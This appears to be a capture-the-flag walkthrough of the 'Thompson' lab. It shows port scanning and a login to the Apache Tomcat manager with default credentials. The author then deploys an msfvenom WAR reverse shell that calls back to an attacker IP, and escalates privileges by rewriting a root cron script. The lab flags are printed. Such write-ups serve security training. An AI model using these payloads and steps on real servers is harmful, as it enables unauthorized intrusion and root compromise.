# Thompson By Mian Al Ruhanyat
## Links 
- 10.10.25.211

## Post Scanning
```sh

nmap -sS -sV -O 10.10.25.211 >> ports.txt


Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 10:38 EDT
Nmap scan report for 10.10.25.211
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/24%OT=22%CT=1%CU=40969%PV=Y%DS=5%DC=I%G=Y%TM=66A1
OS:1253%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(S
OS:P=106%GCD=1%ISR=10A%TI=Z%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%II=I%TS=A)SE
OS:Q(SP=107%GCD=1%ISR=109%TI=Z%TS=8)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I
OS:%TS=C)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O
OS:5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6
OS:=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=O%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.38 seconds

```
- We found there is a http apache tomcat server 
- we know that tomcat is used for java server pages  

![image](https://github.com/user-attachments/assets/6c7f619e-acf2-4724-a287-fe0ea1a18746)

- If we go to the port `10.10.25.211:8080` we can have a tomcat page

![image1](https://github.com/user-attachments/assets/5901ced1-e07c-4aab-b432-8c890a7f2927)

- If we click the manager app it is giving us a login page

![image2](https://github.com/user-attachments/assets/fc21d05b-7413-4b59-bc66-53c29e4a7bb0)

- If we cancel the pop-up it is giving us an error

![image3](https://github.com/user-attachments/assets/f18ee47f-dbaa-4f70-8eef-a659eeb4aab4)

- Here we can have the password
    - name:`tomcat`
    - password:`s3cret`

- In the manager page we can add WAR files from our system

![image3](https://github.com/user-attachments/assets/38885196-c66f-417b-b75d-0b86ebc12280)

- Now we will write a reverse shell or we can use the metaspoitable tool 

- `msfvenom -p java/jsp_shell_reverse_tcp lhost=<Attacker_Ip> lport=1234 -f war > shell.war`

- We are doing through manual reverse shell

![image4](https://github.com/user-attachments/assets/69bed96f-bd30-40a9-9055-b7107408b100)

- we will deploy the shell 

```sh
└─$ nc -nlvp 1234                                          
listening on [any] 1234 ...

```
- And go to the `10.10.25.211:8080/shell`

```sh
└─$ nc -nlvp 1234                                          
listening on [any] 1234 ...
connect to [10.17.88.30] from (UNKNOWN) [10.10.25.211] 54786
ls
bin
home
initrd.img
initrd.img.old
opt
proc
root
```

## We are In!

```sh
cd /home
ls
jack
cd jack
ls 
id.sh
test.txt
user.txt
cat user.txt
39400c90bc683a41a8935e4719f181bf


$ ls
id.sh
test.txt
user.txt
$ cat id.sh
#!/bin/bash
id > test.txt
$ cat test.txt 
uid=0(root) gid=0(root) groups=0(root)


```

## Privilege Escalation
`echo '#!/bin/bash  
cat /root/root.txt > test.txt' > id.sh` 

- We will use this command for converting the root.txt to test.txt
- Because the test.txt has the root privilege
```sh
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	cd /home/jack && bash id.sh

$ echo ' #!/bin/bash  
cat /root/root.txt > test.txt' > id.sh

$cat id.sh
 #!/bin/bash  
cat /root/root.txt > test.txt
$ cat test.txt
d89d5391984c0450a95497153ae7ca3a


```



### **User-txt: `39400c90bc683a41a8935e4719f181bf`**
### **Root-txt: `d89d5391984c0450a95497153ae7ca3a `**

# Pwned!!
